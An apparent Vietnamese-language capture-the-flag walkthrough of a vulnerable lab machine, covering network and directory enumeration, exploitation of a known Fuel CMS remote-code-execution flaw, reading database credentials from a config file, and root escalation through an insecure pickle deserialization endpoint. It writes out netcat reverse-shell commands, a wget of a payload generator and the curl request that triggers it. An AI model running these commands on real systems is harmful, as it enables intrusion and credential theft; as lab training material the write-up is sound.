## Step 1
Dùng **netdiscover -r 10.0.2.0/24** để dò ip của victim

![image](https://user-images.githubusercontent.com/97771705/222623213-96b7c935-f64e-456b-886f-9848fee3f4eb.png)

IP là *10.0.2.5*

Quét port ra 4 port, trong đó có 1 port mysql 

![image](https://user-images.githubusercontent.com/97771705/223318597-503e6337-d3a5-4494-90b9-c779ee69317a.png)

![image](https://user-images.githubusercontent.com/97771705/223318808-c6786e72-4619-48f4-a1ba-4e6f5cc147db.png)

## Step 
Tìm path ẩn bằng gobuster

>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.0.2.5 -x html,php,txt

-dir: Chế độ dò tìm thư mục của gobuster.

```
Gobuster là một công cụ dò tìm thư mục và tệp tin trên các ứng dụng web. Nó hoạt động bằng cách gửi các yêu cầu HTTP tới các URL cụ thể, sau đó phân tích và hiển thị kết quả trả về từ máy chủ web. Gobuster hỗ trợ các phương thức HTTP như GET, POST, HEAD, OPTIONS, PUT, DELETE và CONNECT.
```

Tìm thấy 1 trang structure

![image](https://user-images.githubusercontent.com/97771705/223321109-040f3e01-6879-4f94-afb1-8f21e7253c1d.png)

Truy cập vào trang

![image](https://user-images.githubusercontent.com/97771705/223320795-03127848-e07d-4bea-bd9f-4fb081411f6e.png)

Ta tiếp tục tìm path ẩn của structure

> gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.0.2.5/structure -x html,php,txt

Phát hiện khá nhiều trang hay ho

![image](https://user-images.githubusercontent.com/97771705/223322168-14894230-8eed-4539-8fc5-1567cfc46739.png)

![image](https://user-images.githubusercontent.com/97771705/223321296-4e30fd1a-7e26-44c9-9146-4637662c0ae1.png)

![image](https://user-images.githubusercontent.com/97771705/223321412-efb75479-44be-49e9-85de-c8e00fb1eb09.png)

Trang /fuel mặc định là /fuel/start ->có vẻ như lại cần gobuster :)

> gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.0.2.5/structure/fuel -x html,php,txt

Trang index.php chuyển hướng sang start

![image](https://user-images.githubusercontent.com/97771705/223322704-44a5ab48-433a-499b-92f2-1d471019b544.png)

Thử thay url bằng /index.php/fuel 

![image](https://user-images.githubusercontent.com/97771705/223323114-ac21dfa1-9395-4f2c-99a2-5dbd381c6337.png)

Tìm kiếm trên Google, phát hiện Fuel CMS có lỗ hổng RCE tại những phiên bản cũ. Một trong những code khai thác:

https://github.com/padsalatushal/CVE-2018-16763

Git clone code trên trang github trên về máy kali, sau đó chạy file python của git đó (từ đoạn này ip bị lệch là do xài máy khác để làm nên hơi lú )(ip 10.0.2.4 vẫn là của máy victim)

![image](https://user-images.githubusercontent.com/97771705/223417730-70b91543-6dd8-416a-b789-594e6db99a61.png)

Nhập command reverse shell: tạo ra một kết nối từ victim machine đến attacker machine, thông qua đó attacker có thể kiểm soát và thực thi các lệnh trên victim machine. Khi thực hiện được kết nối này, attacker có thể truy cập vào các tài nguyên và dữ liệu trên victim machine, và có thể thực hiện các hành động như cài đặt phần mềm độc hại, lấy mật khẩu và tạo backdoor để giữ lâu dài quyền kiểm soát truy cập vào victim machine.

>nc 10.0.2.4 4444 /bin/bash

Sau đó đọc thông tin trong database.php

> cat /var/www/html/structure/fuel//config/database.php 

![image](https://user-images.githubusercontent.com/97771705/223422171-a6f74ea1-4bf9-464f-b325-dfbc4dd7b45e.png)

Ta đã có username và password, trở về máy phineas -> đăng nhập thành công

![image](https://user-images.githubusercontent.com/97771705/223422669-fa400788-e058-4df1-b0a1-84fb2ea8bd1b.png)

Hoặc dùng cách ssh cho pro :)

![image](https://user-images.githubusercontent.com/97771705/223422976-1e9f8cb9-08a4-4f94-92a9-7d74e86b6349.png)

![image](https://user-images.githubusercontent.com/97771705/223601249-a9ecd891-e0ba-410b-b8e9-838176fea35c.png)

Tìm kiếm loanh quanh các thư mục -> nhận được flag đầu tiên

![image](https://user-images.githubusercontent.com/97771705/223423539-fb08405f-35fd-4012-a371-6f0a2f6ef8cd.png)

## Step 3

Đến lúc leo thang đặc quyền r :) 

Trong số các folder khởi đầu của máy Phineas, chỉ có duy nhất /web là không có viết hoa. Mở ra có 1 file python

![image](https://user-images.githubusercontent.com/97771705/223424243-49792b4c-cfe5-46b6-acd5-a51bca3f77d9.png)

Có thể thấy nó bị dính lỗi Insecure Deserialization

Dùng lệnh **ip a** để tìm kiếm ip của máy phineas khi ta ssh trên kali ->10.0.2.6

Command exploit: tại terminal root kali

>wget https://gist.githubusercontent.com/kriss-u/085569495cb930e398759c0cbf45e3b7/raw/15fe119ed307ac69673bcaadd9fab84c32a85a00/pickle-payload-py3.py

>python3 pickle-payload-py3.py "nc 10.0.2.6 4444 -e /bin/bash"

>nc -nlvp 4444

Tại terminal ssh phineas 

>curl -d "awesome=Ket_qua_tai_cau_lenh_python_tren" -X POST http://127.0.0.1:5000/heaven

Quay về terminal root kali

![image](https://user-images.githubusercontent.com/97771705/223911610-5bafd821-956c-492d-b454-0379404ad454.png)



